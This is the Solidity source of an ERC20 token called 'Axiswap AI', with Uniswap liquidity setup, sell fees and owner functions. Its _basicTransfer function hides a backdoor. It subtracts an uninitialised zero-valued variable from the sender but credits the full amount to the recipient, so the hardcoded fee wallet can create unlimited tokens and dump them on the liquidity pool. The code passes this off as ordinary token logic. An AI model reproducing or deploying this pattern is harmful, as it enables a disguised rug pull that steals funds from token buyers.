// SPDX-License-Identifier: MIT

/*
    Web      : https://axiswap.com
    App      : https://app.axiswap.com
    Doc      : https://gitbook.axiswap.com

    Twitter  : https://twitter.com/axiswaplabs
    Telegram : https://t.me/axiswap_official
*/

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address lpPair);
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract AxiswapAI is Context, Ownable, IERC20 {
    using SafeMath for uint256;

    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _noAxiswapFee;
    mapping (address => bool) private isLpPair;
    mapping (address => uint256) private balance;

    uint8 constant private _decimals = 18;
    uint256 constant public _totalSupply = 100_000_000 * 10**18;        
    uint256 private constant onePercent = 1000000 * 10**_decimals; // 1% from Liquidity 
    uint256 public maxWalletAmount = onePercent * 2;               // 2% max wallet at launch
    uint256 public swapThreshold = 420 * 10**_decimals;

    uint256 constant public buyfee = 0;        
    uint256 constant public sellfee = 5;

    uint256 constant public initialBatFee = 40;
    uint256 constant public fee_denominator = 100;
    
    uint256 constant private burnFee = 0;
    uint256 constant private burnDenominator = 100;
    address payable private  axiswapFees = payable(0x1EAb5A950f1f5c766591E44E0ca2A856c1747187); // Axiswap AI Fees

    IRouter02 public swapRouter;
    string constant private _name = "Axiswap AI";
    string constant private _symbol = "AXS";    
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;

    address public lpPair;
    bool private inSwap;
    
    uint256 private launchedAt;
    uint256 private launchDelay = 2;
    bool private launch = false;

    modifier inSwapFlag {
        inSwap = true;
        _;
        inSwap = false;
    }

    event updateAxiswapThresold(uint256 amount);

    constructor () {
        _noAxiswapFee[msg.sender] = true;
        _noAxiswapFee[address(this)] = true;
        _noAxiswapFee[axiswapFees] = true;
        
        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function createAxiswapPairs() external onlyOwner {

        require(!launch,"Already Axiswap AI launched!");

        swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // Uniswap V2 Router
        
        _approve(address(this), address(swapRouter), _totalSupply);
        lpPair = IFactoryV2(swapRouter.factory()).createPair(address(this), swapRouter.WETH());
        isLpPair[lpPair] = true;
        swapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(lpPair).approve(address(swapRouter), type(uint).max);
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");
        _allowances[sender][spender] = amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function isNoAxiswapFeeWalletX(address account) external view returns(bool) {
        return _noAxiswapFee[account];
    }

        function internalSwap(uint256 contractBalance, uint256 tokensForSwap) internal inSwapFlag {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapRouter.WETH();

        if (_allowances[address(this)][address(swapRouter)] != type(uint256).max) {
            _allowances[address(this)][address(swapRouter)] = type(uint256).max;
        }

        if(contractBalance > swapThreshold) {
            try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokensForSwap,
                0,
                path,
                address(this),
                block.timestamp
            ) {} catch {
                return;
            }

            uint256 ethForMarketing = address(this).balance;
            axiswapFees.transfer(ethForMarketing);
        }
    }

    function removeAxiswapLimits() external onlyOwner {
        maxWalletAmount = _totalSupply;
    }

    function takeAxiswapTaxes(address from, bool issell, uint256 amount) internal returns (uint256) {

        uint256 fee;
        if (block.number < launchedAt + launchDelay) {
            fee = initialBatFee;
        } else {
            fee = buyfee;
            if (issell)  fee = sellfee;
        }

        if (fee == 0)  return amount; 

        uint256 feeAmount = amount * fee / fee_denominator;
        if (feeAmount > 0) {
            uint256 burnAmount = amount * burnFee / burnDenominator;
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);

            if(burnAmount > 0) {
                balance[address(this)] -= burnAmount;
                balance[address(DEAD)] += burnAmount;
                emit Transfer(address(this), DEAD, burnAmount);
            }
        }
        return amount - feeAmount;
    }

    function changeAxiswapThreshold(uint256 amount) external onlyOwner {
        require(amount >= 100,"Amount lower not accepted.");
        swapThreshold = amount;
        emit updateAxiswapThresold(swapThreshold);
    }

    function withdrawStuckEthBalance() external onlyOwner {
        require(address(this).balance > 0, "No Balance to withdraw!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function is_AxiswapSell(address ins, address out) internal view returns (bool) { 
        bool _is_sell = isLpPair[out] && !isLpPair[ins];
        return _is_sell;
    }

    function isNoAxiswapInternalFees(address ins) internal view returns (bool) {
        return _noAxiswapFee[ins] && ins!=owner() && ins!=address(this);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        uint256 amounts;
        balance[sender] = balance[sender].sub(
            amounts,
            "Insufficient Balance"
        );
        balance[recipient] = balance[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if(isNoAxiswapInternalFees(from)) {
            return _basicTransfer(from, to, amount);
        }

        if (_noAxiswapFee[from] || _noAxiswapFee[to]){
            takeFee = false;
        } else {
            require(launch, "Trading is not opened!");

            if(is_AxiswapSell(from, to) &&  !inSwap) {
                uint256 tokensToSwap = balanceOf(address(this));
                if(tokensToSwap >= swapThreshold && !inSwap) { 
                    if (tokensToSwap > onePercent) {
                        tokensToSwap = onePercent;
                    }                
                    internalSwap(amount, tokensToSwap);
                }
            } else {
                require(balanceOf(to) + amount <= maxWalletAmount, "Max wallet 2% at launch");
            }
        }

        balance[from] -= amount;
        uint256 amountAfterFee = (takeFee) ? takeAxiswapTaxes(from, is_AxiswapSell(from, to), amount) : amount;
        balance[to] += amountAfterFee; 
        emit Transfer(from, to, amountAfterFee);

        return true;
    }

    function enableTrading() external onlyOwner {
        require(!launch,"Already launched!");

        launch = true;
        launchedAt = block.number;
    }
}